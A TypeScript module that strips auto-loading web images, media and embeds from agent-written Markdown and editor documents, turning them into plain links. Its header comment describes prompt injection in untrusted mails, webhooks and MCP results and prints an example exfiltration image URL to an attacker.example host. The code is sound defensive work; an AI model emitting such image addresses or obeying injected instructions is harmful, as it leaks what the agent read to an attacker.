/**
 * Custom agents — what an agent writes never loads anything by itself: a web image in its Markdown
 * (the report, the content of staged or applied pages) becomes a plain link to that image.
 *
 * Agents read text nobody vouches for (mails, form answers, webhook bodies, MCP results). An image
 * address is the classic way an instruction hidden in such text smuggles data out: the browser
 * fetches `![](https://attacker.example/?q=<what the agent read>)` the moment the page opens — in
 * the editor, the feed, a share link. A link is only followed when a person clicks it. Images of
 * this workspace (`onefile:`), data: images and relative paths stay images; code spans and fenced
 * code stay as written.
 */

/** A target the browser would fetch from somewhere else: http(s) or protocol-relative. */
const WEB = /^(https?:)?\/\//i

/** ```, ~~~ fences (CommonMark: up to three spaces in front). */
const FENCE = /^ {0,3}(`{3,}|~{3,})/

/** ![alt](<url> "title") — the target with or without angle brackets, an optional title. */
const INLINE = /!\[((?:\\.|[^\]\\])*)\]\(\s*(<[^>\n]+>|[^\s)]+)((?:\s+(?:"[^"\n]*"|'[^'\n]*'|\([^)\n]*\)))?)\s*\)/g

/** ![alt][label] · ![alt][] · ![alt] (a reference to a definition further down). */
const REF = /!\[((?:\\.|[^\]\\])*)\](?:\[((?:\\.|[^\]\\])*)\])?/g

/** [label]: <url> "title" */
const DEF = /^ {0,3}\[((?:\\.|[^\]\\])+)\]:\s*(<[^>\n]+>|\S+)/

/** More image starts than any real line has: every "![" becomes "[" (keeps the patterns above linear in practice). */
const MANY = 50

const bare = (target: string) => target.replace(/^<|>$/g, '').trim()
const label = (s: string) => s.trim().replace(/\s+/g, ' ').toLowerCase()

/** Images that may stay (addresses the page shows already). */
type Keep = ReadonlySet<string> | undefined

/** A web address that would be loaded as a new image. */
const loads = (url: string, keep: Keep) => WEB.test(url) && !keep?.has(url)

/** Reference labels whose definition points to the web. */
function webDefinitions(lines: string[], keep: Keep): Set<string> {
  const out = new Set<string>()
  for (const line of lines) {
    const m = DEF.exec(line)
    if (m && loads(bare(m[2]), keep)) out.add(label(m[1]))
  }
  return out
}

/** One stretch of text outside code: web images → links. */
function plain(text: string, defs: Set<string>, keep: Keep): string {
  if (text.split('![').length - 1 > MANY) return text.replace(/!\[/g, '[')
  const inline = text.replace(INLINE, (all, alt: string, target: string, title: string) => {
    const url = bare(target)
    if (!loads(url, keep)) return all
    return `[${alt.trim() ? alt : url.replace(/[[\]]/g, '')}](${target}${title})`
  })
  if (!defs.size) return inline
  return inline.replace(REF, (all, alt: string, ref: string | undefined, at: number, src: string) => {
    // an inline image kept above (a local one) is not a reference
    if (src[at + all.length] === '(') return all
    return defs.has(label(ref || alt)) ? all.slice(1) : all
  })
}

/**
 * Markdown with every web image (inline or by reference) turned into a link to it. `keep`: addresses
 * the page already shows as images — a rewrite of the page may keep those (they carry nothing new).
 */
export function withoutWebImages(markdown: string, keep?: ReadonlySet<string>): string {
  if (!markdown.includes('![')) return markdown
  const lines = markdown.split('\n')
  const defs = webDefinitions(lines, keep)
  let fence: string | null = null
  return lines
    .map((line) => {
      const f = FENCE.exec(line)
      if (fence) {
        if (f && f[1][0] === fence[0] && f[1].length >= fence.length) fence = null
        return line
      }
      if (f) {
        fence = f[1]
        return line
      }
      // inline code spans are kept as they are
      return line
        .split(/(`+[^`]*`+)/)
        .map((part, i) => (i % 2 ? part : plain(part, defs, keep)))
        .join('')
    })
    .join('\n')
}

interface DocNode {
  type?: string
  attrs?: Record<string, unknown>
  content?: DocNode[]
  marks?: Array<{ type: string; attrs?: Record<string, unknown> }>
  text?: string
}

/** Blocks that show something from an address: their src (image, video, audio). */
const MEDIA = new Set(['image', 'video', 'audio'])

/** The web images / video / audio a document shows (their src), for `withoutWebImages(…, keep)`. */
export function webImagesOf(doc: DocNode | null | undefined): Set<string> {
  const out = new Set<string>()
  const walk = (n: DocNode | null | undefined) => {
    if (!n) return
    const src = n.type && MEDIA.has(n.type) ? n.attrs?.src : null
    if (typeof src === 'string' && WEB.test(src.trim())) out.add(src)
    for (const c of n.content ?? []) walk(c)
  }
  walk(doc)
  return out
}

const str = (v: unknown) => (typeof v === 'string' ? v : '')

/** A paragraph with one link (a block that would have loaded `href` by itself). */
function linkLine(label: string, address: string): DocNode {
  const href = address.replace(/^\/\//, 'https://')
  return { type: 'paragraph', content: [{ type: 'text', text: label.trim() || href, marks: [{ type: 'link', attrs: { href } }] }] }
}

/**
 * The document made of Claude's Markdown, without anything that loads by itself or reaches into the
 * workspace. Markdown is not the only way in: raw HTML in it (`<img>`, `<video>`, `<div data-type="embed">`
 * …) becomes editor blocks too, and entities or escapes hide an address from a text filter. So the
 * finished document is checked: web images, video and audio become links (addresses in `keep` — the ones
 * the page shows already — stay), files from the web and embeds (frames) become links, bookmarks become
 * links (no preview image), synced-block references, meeting blocks and task blocks become their plain blocks.
 * Legitimate Markdown never makes those blocks (they are written out as links), so nothing real is lost.
 */
export function withoutWebLoads<T extends DocNode>(doc: T, keep?: ReadonlySet<string>): T {
  const fix = (n: DocNode): DocNode[] => {
    const a = n.attrs ?? {}
    if (n.type && MEDIA.has(n.type)) {
      const src = str(a.src).trim()
      if (WEB.test(src) && !keep?.has(str(a.src))) return [linkLine(str(a.alt) || str(a.name) || str(a.caption), src)]
    }
    if (n.type === 'fileBlock' && WEB.test(str(a.src).trim())) return [linkLine(`📎 ${str(a.name)}`, str(a.src).trim())]
    if (n.type === 'embed' || n.type === 'bookmark') {
      const url = str(a.url).trim()
      return url && /^https?:\/\//i.test(url) ? [linkLine(str(a.title) || url, url)] : []
    }
    // blocks Markdown never makes (raw HTML could): their plain blocks — a task too (Claude never writes one
    // this way: a task it read and writes back stays that task only through keepItems, editor/workitem)
    if (n.type === 'syncedBlock' || n.type === 'meetingNotes' || n.type === 'workItem') return (n.content ?? []).flatMap(fix)
    if (!n.content) return [n]
    const kids = n.content.flatMap(fix)
    return kids.length === n.content.length && kids.every((k, i) => k === n.content![i]) ? [n] : [{ ...n, content: kids }]
  }
  const [out] = fix(doc)
  return (out ?? doc) as T
}
